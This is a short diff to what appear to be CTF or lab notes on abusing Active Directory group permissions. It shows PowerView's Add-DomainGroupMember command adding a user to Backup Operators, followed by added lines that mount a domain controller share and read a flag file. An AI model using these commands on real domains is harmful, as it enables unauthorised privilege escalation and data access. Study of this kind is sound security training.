@@ -52,6 +52,10 @@ we can add members to a group when we have GenericAll, GenericWrite, Self, AllEx
     OR C:\Tools> net group "Backup Operators" /domain, if from a domain-joined machine
   add ourselves via powerview
     PS C:\Tools> Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
+      NOTE: once we add ourselves, we must reauthenticate 
+  now we can read from the TestGroup share
+    PS C:\Tools> net use K: \\DC01\TestGroup
+    PS C:\Tools> ls K:\flag.txt
 
 resources:
 https://www.thehacker.recipes/ad/movement/dacl#abuse
